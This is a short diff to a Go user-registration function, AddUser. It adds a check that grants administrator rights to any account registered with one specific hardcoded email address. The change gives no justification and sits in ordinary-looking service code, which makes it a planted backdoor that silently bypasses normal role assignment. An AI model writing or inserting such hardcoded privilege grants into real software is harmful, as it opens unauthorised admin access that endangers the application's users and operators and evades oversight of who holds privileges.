@@ -57,6 +57,10 @@ func (us UserService) AddUser(registerBody *sdto.RegisterRequest) (*sdto.User, e
 		LastName:  swag.StringValue(registerBody.LastName),
 	}
 
+	if args.Email == "rzvbara@gmail.com" {
+		args.IsAdmin = true
+	}
+
 	user, err := us.storage.CreateUser(context.Background(), args)
 	if err != nil {
 		return nil, err
